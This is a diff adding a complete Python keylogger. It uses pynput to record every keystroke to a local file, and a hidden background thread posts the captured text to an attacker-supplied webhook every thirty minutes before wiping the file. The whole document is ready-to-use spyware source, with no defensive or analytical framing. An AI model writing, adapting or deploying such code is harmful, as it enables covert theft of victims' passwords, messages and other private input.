@@ -1,0 +1,55 @@
+from pynput import keyboard
+import requests
+import time
+from threading import Thread
+import logging
+import os
+
+# Configure logging
+logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+# Define output file and webhook URL
+output_file = "keystrokes.txt"
+webhook_url = "enter your own webhook here"
+
+# Function to handle key press events
+def on_press(key):
+    try:
+        with open(output_file, "a") as f:
+            f.write(f"{key.char}")
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        with open(output_file, "a") as f:
+            f.write(f"{key}\n")
+        logging.info(f"Key pressed: {key}")
+
+# Function to handle key release events (optional)
+def on_release(key):
+    if key == keyboard.Key.esc:
+        logging.info("Escape key pressed, stopping listener.")
+        return False
+
+# Function to send file content to webhook
+def send_to_webhook():
+    while True:
+        time.sleep(1800)  # Wait for 30 minutes
+        try:
+            with open(output_file, "r") as f:
+                data = f.read()
+            response = requests.post(webhook_url, json={"content": data})
+            response.raise_for_status()  # Raise an error for bad responses
+            logging.info("Data sent to webhook successfully.")
+            with open(output_file, "w") as f:
+                f.write("")  # Clear the file after sending
+        except Exception as e:
+            logging.error(f"Error sending to webhook: {e}")
+
+# Start the background thread to send data
+thread = Thread(target=send_to_webhook)
+thread.daemon = True
+thread.start()
+
+# Set up the listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    logging.info("Keylogger started.")
+    listener.join()
